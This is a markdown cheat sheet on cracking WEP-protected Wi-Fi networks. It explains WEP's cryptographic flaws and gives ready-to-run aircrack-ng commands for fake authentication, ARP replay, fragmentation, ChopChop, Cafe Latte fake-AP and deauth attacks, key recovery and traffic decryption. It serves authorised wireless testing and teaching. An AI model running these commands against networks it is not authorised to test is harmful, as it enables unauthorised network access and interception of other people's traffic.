---
title: WEP
---

# WEP

## WEP Weaknesses

WEP (Wired Equivalent Privacy) was designed to provide confidentiality similar to wired networks. It failed badly.

### How WEP Works (Simplified)

1. **Key** : `40` or `104 bits` (shared secret)
2. **IV** : `24-bit` Initialization Vector (sent in cleartext)
3. **Keystream** : `RC4(IV + Key)` -> generates a pseudo-random stream (`PRGA`)
4. **Encryption** : `(Data + ICV) ⊕ Keystream`

::: details The Flaws

| Flaw                        | Why It's Broken                                                                            |
| --------------------------- | ------------------------------------------------------------------------------------------ |
| **IV too short**            | 24 bits → only 16 million possibilities. After ~5000 packets, IVs repeat → keystream reuse |
| **ICV (CRC32)**             | CRC32 is linear, not cryptographic. Attacker can modify packets and recalculate ICV        |
| **No replay protection**    | Captured packets can be reinjected                                                         |
| **Weak RC4 implementation** | Early keystream bytes are biased → FMS attack (1999)                                       |

:::

::: tip PRGA / Keystream
The keystream (PRGA) is RC4(IV + Key). If you know the keystream for a given packet size, you can forge any packet of that size. Most WEP attacks aim to recover the keystream.
:::

## 🔍 Reconnaissance & Association

### Fake Authentication (if no client)

- [aircrack-ng.org (doc)](https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients)

::: tip WEP has two authentication modes:

- **`Open`**: The AP accepts any client. The WEP key is only used for encryption, not authentication.
- **`Shared Key (SKA)`**: The AP sends a challenge, and the client must encrypt it with the WEP key. This requires knowing the key.

:::

Most WEP networks use **Open** mode. To inject packets, you must be associated with the AP:

- If a client is connected -> use their MAC (`-h $CLIENT_MAC`)
- If no client is connected -> associate yourself with fake authentication

```bash
aireplay-ng -1 0 -a $BSSID -h $OUR_MAC $INTERFACE
```

This sends an authentication request and an association request. After this, your MAC appears in airodump-ng's station list.

::: tip When to use

- Always when no client is connected
- Optionally when a client is connected (you can also use their association)

:::

For long attacks ([Fragmentation](#fragmentation), [ChopChop](#korek-chopchop)), maintain the association:

::: code-group

```bash [aircrack-ng]
aireplay-ng -1 5000 -o 1 -q 5 -e $ESSID -a $BSSID -h $OUR_MAC $INTERFACE
```

```bash [wifite]
wifite --wep --require-fakeauth --bssid $BSSID
```

:::

::: warning SKA mode
If the AP uses Shared Key mode, fake authentication won't work. You must either:

- Spoof a legitimate client's MAC (if one is connected)
- Capture a successful authentication to extract the keystream (advanced)

:::

## 📡 Capture & Cracking

Before starting any attack, set up capture and cracking in the background:

```bash
# Capture IVs
airodump-ng -c $CHANNEL --bssid $BSSID -w capture $INTERFACE

# Crack (retries every 5000 IVs)
aircrack-ng -a 1 -b $BSSID capture.cap
```

The `#Data` column in airodump-ng shows the IV count. Once it reaches **~20,000 - 60,000**, aircrack-ng will recover the key.

## ⚔️ Attacks

### ARP Replay

::: tip Mechanism

- The AP always replies to ARP requests. By capturing one and replaying it, each reply generates a new IV.
- Requires a client connected + an ARP request in the air.

:::

```bash
aireplay-ng -3 -b $BSSID -h $CLIENT_MAC $INTERFACE
```

::: danger Note
If no ARP request appears, combine with a deauth to force the client to reconnect.
:::

### Fragmentation

::: tip Mechanism

- Sends fragments to the AP. The AP returns the keystream (PRGA) for that packet size. Use it to forge an ARP request, then inject with ARP Replay to generate IVs.
- Requires being associated with the AP (use fake auth if no client).

:::

```bash
# Get PRGA
aireplay-ng -5 -b $BSSID -h $CLIENT_MAC $INTERFACE

# Check IPs (optional)
tcpdump -s 0 -n -e -r replay_dec-xxxx-xxxxxx.cap

# Forge ARP request
packetforge-ng -0 -a $BSSID -h $CLIENT_MAC -k $AP_IP -l $CLIENT_IP -y fragment-xxxx.xor -w forged.cap

# Inject
aireplay-ng -2 -r forged.cap $INTERFACE
```

::: warning No IPs in tcpdump ?
Use broadcast `255.255.255.255` for both `-k` and `-l` in `packetforge-ng`. The AP will still respond.
:::

#### KoreK ChopChop

- [Theory aircrack-ng](https://www.aircrack-ng.org/doku.php?id=chopchoptheory)

::: tip Mechanism

- Takes a captured packet, removes the last byte, guesses its value (0-255), and recalculates the ICV. When the AP doesn't respond, the guess was correct. Repeats until the full keystream is recovered.
- Requires being associated with the AP (use fake auth if no client).

:::

```bash
# Get PRGA
aireplay-ng -4 -b $BSSID -h $CLIENT_MAC $INTERFACE

# Forge ARP request (same as fragmentation)
packetforge-ng -0 -a $BSSID -h $CLIENT_MAC -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-xxxx.cap -w forged.cap

# Inject
aireplay-ng -2 -r forged.cap $INTERFACE
```

> If you used fake authentication, replace `$CLIENT_MAC` with `$OUR_MAC`.

### Cafe Latte

- [Theory aircrack-ng](https://www.aircrack-ng.org/doku.php?id=cafe-latte)

::: tip Mechanism
Creates a fake AP to force a client to emit ARP requests, then replays them to the real AP.

1. **Deauth** client from real AP
2. **Fake AP** (same BSSID/SSID) attracts client
3. Client emits **ARP requests** during reassociation → captured
4. **Replay** ARP requests to real AP → generates IVs
5. **Crack** with aircrack-ng

Requires a client connected (active or not).
:::

```bash
# Listen for ARP
aireplay-ng --caffe-latte -b $BSSID -h $CLIENT_MAC $INTERFACE

# Fake AP
airbase-ng -c $CHANNEL -a $BSSID -e "$SSID" $INTERFACE -W 1 -L

# Deauth to force client reconnect
aireplay-ng -0 10 -a $BSSID -c $CLIENT_MAC $INTERFACE
```

## 🔓 Cracking

Possible key lengths: `64/128/152/256/512 bits`

```bash
# WEP cracking via IVs
aircrack-ng -a 1 -b $BSSID capture.cap

# With key length specified (e.g., 64 bits)
aircrack-ng -a 1 -n 64 -b $BSSID capture.cap
```

::: details wpa_supplicant

```bash
# wep.conf
network={
    ssid="$SSID"
    key_mgmt=NONE
    wep_key0=AABBCCDDEE
    wep_tx_keyidx=0
}
```

```bash
sudo wpa_supplicant -i $INTERFACE -c wep.conf
sudo dhclient $INTERFACE
```

:::

### Brute Force

```bash [aircrack-ng]
# Wordlist
aircrack-ng -a 1 -b $BSSID -w rockyou.txt capture.cap

# Generate all 5-byte combinations
john --incremental=ASCII5 --stdout | aircrack-ng -n 64 -a 1 -b $BSSID capture.cap -w-
```

## 🔐 Decrypt (airdecap-ng)

Decrypt a captured WEP file once the key is recovered:

```bash
airdecap-ng -w $WEP_KEY capture.cap
```
